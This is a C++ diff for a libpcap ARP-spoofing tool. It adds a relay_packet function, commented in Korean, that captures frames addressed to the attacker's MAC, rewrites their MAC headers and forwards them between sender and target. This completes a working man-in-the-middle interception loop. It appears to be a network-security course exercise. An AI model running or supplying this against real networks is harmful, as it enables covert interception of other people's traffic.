@@ -166,6 +166,54 @@ void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip t
 }
 
 
+void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip ){
+	//패킷 캡쳐해서, 목적지 ip는 타겟인데, 목적지 MAC이 나의 MAC과 동일하면 이 내용을 복사해서 타겟의 mac,ip로 다시 보내준다
+	// smac == sender.mac && dmac ==my.mac => sender.mac = my.mac , dmac = target.mac
+	// smac == target.mac && dmac == my.ac => sender.mac = my.mac , dmac = sender.mac 
+	// 나머지는 무시 
+		while (true) {
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+		int res = pcap_next_ex(handle, &header, &packet);
+		if (res == 0) continue; 
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+			}
+		PEthHdr eth_hdr = (PEthHdr)packet;
+		std::cout<<"릴레이 시작" << std::endl;
+		if(eth_hdr->type() == EthHdr::Ip4) {
+			u_char * relay_packet = new u_char[header->caplen];
+			memcpy(relay_packet, packet, header->caplen);
+
+			PEthHdr relay_eth_hdr = (PEthHdr)relay_packet;
+				std::cout << "Captured Packet of Mac Address from"<< ": " << std::string(eth_hdr->smac_) <<"to :"<<std::string(eth_hdr->dmac_)<< std::endl;
+
+
+			if (eth_hdr->smac_ == sender_mac && eth_hdr->dmac_ == myMac) {
+				relay_eth_hdr->smac_ = myMac;
+				relay_eth_hdr->dmac_ = target_mac;
+				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(sender_mac) <<"to :"<<std::string(target_mac)<< std::endl;
+
+			} else if(eth_hdr->smac_ == target_mac && eth_hdr->dmac_ == myMac){
+				relay_eth_hdr->smac_ = myMac;
+            	relay_eth_hdr->dmac_ = sender_mac;
+				std::cout << "Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<"to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;
+
+			} else{
+				delete[] relay_packet;
+				continue;
+			}
+			int res = pcap_sendpacket(handle, relay_packet, header->caplen);
+
+			if (res != 0){
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+
+			delete[] relay_packet;
+		}
+	}
+}
 
 
 
@@ -226,6 +274,10 @@ int main(int argc, char* argv[]) {
 
 
 		std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;
+
+		relay_packet(handle, myMac, senderMac, senderIp, targetMac, targetIp);
+
+		std::cout << "[INFO] Completed relay packet for this pair." << std::endl << std::endl;
 
 		// 다음 쌍으로 넘어가기 전에 대기 (예: 1초 대기)
 		std::this_thread::sleep_for(std::chrono::seconds(1));
